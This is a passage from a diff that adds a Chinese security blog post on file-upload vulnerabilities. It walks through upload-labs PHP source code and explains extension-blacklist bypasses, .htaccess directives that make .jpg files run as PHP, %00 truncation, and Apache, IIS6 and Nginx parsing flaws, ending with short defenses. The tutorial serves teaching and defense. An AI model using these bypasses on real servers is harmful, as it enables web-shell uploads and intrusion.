invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;                  <span class="variable">$is_upload</span> = <span class="literal">true</span>;             &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;                 <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;             &#125;         &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123;             <span class="variable">$msg</span> = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;         &#125;     &#125; <span class="keyword">else</span> &#123;         <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;     &#125; &#125; </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>用黑名单不允许上传.asp,.aspx,.php,.jsp后缀的文件</p>
+</li>
+<li><p>但可以上传.phtml .phps .php5 .pht</p>
+</li>
+<li><p>前提是apache的httpd.conf中有如下配置代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .phtml .phps .php5 .pht </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>当我们修改文件后缀名之后，可以发现到文件正常上传成功。</p>
+</li>
+</ul>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724205806084.png" alt="image-20230724205806084"></p>
+<ul>
+<li>我们从RAW包中可以查找到文件上传的位置。</li>
+</ul>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724205816759.png" alt="image-20230724205816759"></p>
+<ul>
+<li>我们可以在浏览器中进行构建URL（就是构建一下访问地址）进行访问。</li>
+<li><strong>构建的URL：</strong><a target="_blank" rel="noopener" href="http://127.0.0.1/upload/upload/202105181219104196.php5">http://127.0.0.1/upload/upload/202105181219104196.php5</a></li>
+<li><strong>URL模板：</strong> <a target="_blank" rel="noopener" href="http://127.0.0.1/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%B7%AF%E5%BE%84">http://127.0.0.1/upload/文件上传路径</a></li>
+<li>该URL模板只适用该案例</li>
+</ul>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724205830066.png" alt="image-20230724205830066"></p>
+<hr>
+<p><a name="t9iAg"></a></p>
+<h4 id="3-4-3-重写绕过"><a href="#3-4-3-重写绕过" class="headerlink" title="3.4.3 重写绕过"></a>3.4.3 重写绕过</h4><ul>
+<li>服务端将黑名单的后缀名替换为空，但仅进行一次。上传.phphpp后缀，替换php一次为空，则后缀<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>; <span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;   </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;       </span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);        </span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);      </span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);     </span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];       </span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;            </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;        </span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;         &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123;             <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;         &#125;     &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;         <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;     &#125; &#125; </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<a name="JDbMz"></a></li>
+</ul>
+<h4 id="3-4-4-特殊可解析后缀绕过"><a href="#3-4-4-特殊可解析后缀绕过" class="headerlink" title="3.4.4 特殊可解析后缀绕过"></a>3.4.4 特殊可解析后缀绕过</h4><ul>
+<li>黑名单规则不严谨，在某些特定环境中某些特殊后缀名仍会被当做PHP文件解析。phplphp2&#x2F;php3&#x2F;php4lphp5&#x2F;php6lphp7&#x2F;phtlphtm&#x2F;phtml</li>
+<li>基于debian和ubuntu的apt-get安装apache，默认对于文件的解析规则如下。</li>
+</ul>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724205925262.png" alt="image-20230724205925262"><br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724205939084.png" alt="image-20230724205939084"><br><a name="eCh0E"></a></p>
+<h4 id="3-4-5-htaccess绕过"><a href="#3-4-5-htaccess绕过" class="headerlink" title="3.4.5 .htaccess绕过"></a>3.4.5 .htaccess绕过</h4><ul>
+<li>在apache里，这个文件作为一个配置文件，可以用来控制所在目录的访问权限以及解析设置。即是，可以通过设置可以将该目录下的所有文件作为php文件来解析</li>
+<li>.htaccess可以写入apache配置信息，改变当前目录以及子目录的Apache配置信息。</li>
+<li><strong>前提条件：</strong> 配置上允许.htaccess生效<br />Apache开启rewrite模块<br />.apache配置文件为AllowOverride All(默认为None)</li>
+</ul>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724205950708.png" alt="image-20230724205950708"></p>
+<ul>
+<li><p><strong>方法一：</strong> 所有jpg后祭都会背当做PHP解析</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- AddType application/x-httpd-php.jpg </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724210005433.png" alt="image-20230724210005433"></p>
+</li>
+<li><p><strong>方法二：</strong> 带有jpg关键字会被当岗PHP解析</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;sec.jpg&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><a name="lfB4y"></a></p>
+</li>
+</ul>
+<h4 id="3-4-6-利用操作系统特性-windos"><a href="#3-4-6-利用操作系统特性-windos" class="headerlink" title="3.4.6 利用操作系统特性-windos"></a>3.4.6 利用操作系统特性-windos</h4><ul>
+<li>利用window对于文件和文件名的限制，以下字符放在结尾时，不符合操作系统的命名规范,在最后生成文件时，字符会被自动去除。</li>
+</ul>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724210022607.png" alt="image-20230724210022607"></p>
+<ul>
+<li><p><strong>源码分析：</strong></p>
+</li>
+<li><p><strong>第一种：</strong> 对应upland第6题</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>; <span class="variable">$msg</span> = <span class="literal">null</span>; </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;       </span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);         </span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];       </span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点      </span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);        </span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写      </span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA                  </span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;            </span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];      </span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;             <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;            </span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;             &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;                 <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;             &#125;         &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123;             <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传&#x27;</span>;         &#125;     &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;         <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;     &#125; &#125; </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>这题没有对后缀名进行去空，因此可以在后缀名加空格绕过</strong></p>
+</li>
+</ul>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724210124625.png" alt="image-20230724210124625"><br><a name="rnmZs"></a></p>
+<h4 id="3-4-7-00截断"><a href="#3-4-7-00截断" class="headerlink" title="3.4.7 %00截断"></a>3.4.7 %00截断</h4><ul>
+<li><p>%00是chr(O)，它不是空格，是NULL，空字符。</p>
+</li>
+<li><p>当程序在输出含有chr(O)变量时，chr(O)后面的数据会被停止，换句话说，就是误把它当做结束符，后面的数据直接忽略，这就导致漏洞产生的原因。</p>
+</li>
+<li><p>在文件上传中，利用%00截断，在文件扩展名验证时，是取文件的扩展名来做验证，但是最后文件保存在本地时，%00会截断文件名，只保存%00之前的内容。</p>
+</li>
+<li><p><strong>前提条件：</strong> PHP版本 &lt; 5.34 、php的magic_quotes_gpc为OFF状态</p>
+</li>
+<li><p><strong>源码分析：</strong></p>
+</li>
+<li><p><strong>第一种：</strong> 对应upland第11题</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>; <span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;    </span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);    </span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;       </span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];      </span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;         <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;       </span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;         &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;             <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;         &#125;     &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;         <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;     &#125; &#125; </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>白名单判断，但$img_path是直接拼接，因此可以利用%00截断绕过。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$img_path = $_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>第二种：</strong> 对应upland第19题</p>
+</li>
+<li><p><strong>前提条件：</strong> PHP版本 &lt; 5.34 、php的magic_quotes_gpc为OFF状态</p>
+</li>
+<li><p><strong>源码分析：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>; <span class="variable">$msg</span> = <span class="literal">null</span>; </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;       </span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);         </span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];       </span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);         </span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$deny_ext</span>)) &#123;            </span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];        </span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;         </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;              </span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;             &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;                 <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;             &#125;         &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;             <span class="variable">$msg</span> = <span class="string">&#x27;禁止保存为该类型文件！&#x27;</span>;         &#125;     &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;         <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;     &#125; &#125; </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>发现move_uploaded_file()函数中的img_path是由post参数save_name控制的，因此可以在save_name利用00截断绕过，方法同上<br><a name="fkYcq"></a></p>
+</li>
+</ul>
+<h3 id="3-5-服务器解析漏洞"><a href="#3-5-服务器解析漏洞" class="headerlink" title="3.5 服务器解析漏洞"></a>3.5 服务器解析漏洞</h3><ul>
+<li>解析漏洞,是指中间件(Apache、nginx、iis等)在解析文件时出现了漏洞,从而,黑客可以利用该漏洞实现非法文件的解析。</li>
+</ul>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724210300296.png" alt="image-20230724210300296"><br><a name="LLfsb"></a></p>
+<h4 id="3-5-1-Apache-解析漏洞"><a href="#3-5-1-Apache-解析漏洞" class="headerlink" title="3.5.1 Apache 解析漏洞"></a>3.5.1 Apache 解析漏洞</h4><ul>
+<li>Apache解析文件规则是从右到左。例如shel.php.gix.ccc，apache会先识别ccc，ccc不被识别，则识别gix，以此类推，最后会被识别为php来运行。</li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/wn314/article/details/77074477?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162143812416780265498323%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=162143812416780265498323&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-77074477.first_rank_v2_pc_rank_v29&utm_term=apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E">Apache 解析漏洞</a><br><a name="uBUXT"></a></li>
+</ul>
+<h4 id="3-5-2-IIS6-0-漏洞"><a href="#3-5-2-IIS6-0-漏洞" class="headerlink" title="3.5.2 IIS6.0 漏洞"></a>3.5.2 IIS6.0 漏洞</h4><ul>
+<li><strong>目录解析 :</strong></li>
+<li>目录名为.asp、.asa、.cer，则目录下的所有文件都会被作为ASP</li>
+<li>url&#x2F;test.asp&#x2F;shell.jpg会被当作asp脚本运行。</li>
+<li><strong>文件解析 ：</strong></li>
+<li>文件名中分号后不被解析，例如.asp;、.asa;、.cer;。</li>
+<li>url&#x2F;test.asp;shell.jpg会被当作asp脚本运行。</li>
+<li><strong>文件类型解析 ：</strong></li>
+<li>.asa，.cer，.cdx都会被作为asp文件执行。</li>
+<li>url&#x2F;shell.asa会被作为asp文件执行。</li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_39353923/article/details/83515616?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162143782616780357287697%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=162143782616780357287697&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-83515616.first_rank_v2_pc_rank_v29&utm_term=iis6.0%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E">IIS 6.0 解析漏洞</a><br><a name="DQ5uX"></a></li>
+</ul>
+<h4 id="3-5-3-Nginx-漏洞"><a href="#3-5-3-Nginx-漏洞" class="headerlink" title="3.5.3 Nginx 漏洞"></a>3.5.3 Nginx 漏洞</h4><ul>
+<li>PHP+nginx默认是以cgi的方式去运行，当用户配置不当，会导致任意文件被当作php去解析。</li>
+<li><strong>利用条件:</strong><br />以FastCGl运行<br />cgi.fix_pathinfo&#x3D;1(全版本PHP默认为开启)</li>
+<li>例如如果满足上述条件，当你访问url&#x2F;shell.jpg&#x2F;shell.php时，shell.jpg会被当作php去执行。</li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_51803069/article/details/109330765?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162143795416780271576906%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=162143795416780271576906&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-109330765.first_rank_v2_pc_rank_v29&utm_term=Nginx%20%E6%BC%8F%E6%B4%9E">Nginx 解析漏洞</a><br><a name="TgTbn"></a></li>
+</ul>
+<h4 id="3-5-4-Nginx-文件名逻辑漏洞（CVE-2013-4547）了解"><a href="#3-5-4-Nginx-文件名逻辑漏洞（CVE-2013-4547）了解" class="headerlink" title="3.5.4 Nginx 文件名逻辑漏洞（CVE-2013-4547）了解"></a>3.5.4 Nginx 文件名逻辑漏洞（CVE-2013-4547）了解</h4><ul>
+<li>影响版本:Nginx 0.8.41 ~ 1.4.3&#x2F;1.5.0 ~ 1.5.7</li>
+<li>利用过程:<br />上传一个shell.jpg文件，注意最后为空格<br />访问url&#x2F;shell.jpg[Ox20][Ox00].php<br />(两个中括号中的数字是用Burp在Hex界面中更改)</li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yuzly/p/11221564.html">漏洞复现参考链接</a><br><a name="FIjeA"></a></li>
+</ul>
+<h2 id="四、文件上传漏洞防御"><a href="#四、文件上传漏洞防御" class="headerlink" title="四、文件上传漏洞防御"></a>四、文件上传漏洞防御</h2><ul>
+<li>服务端文件扩展名使用白名单检测+文件名重命名</li>
+<li>对文件内容进行检测</li>
+<li>对中间件做安全的配置</li>
+<li>…</li>
+</ul>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Serendipity</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://example.com/2023/07/21/wen-jian-shang-chuan/">http://example.com/2023/07/21/wen-jian-shang-chuan/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">Serendipity</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/%E7%BD%91%E5%AE%89/">
+                                    <span class="chip bg-color">网安</span>
+                                </a>
+                            
+                                <a href="/tags/%E6%BC%8F%E6%B4%9E/">
+                                    <span class="chip bg-color">漏洞</span>
+                                </a>
+                            
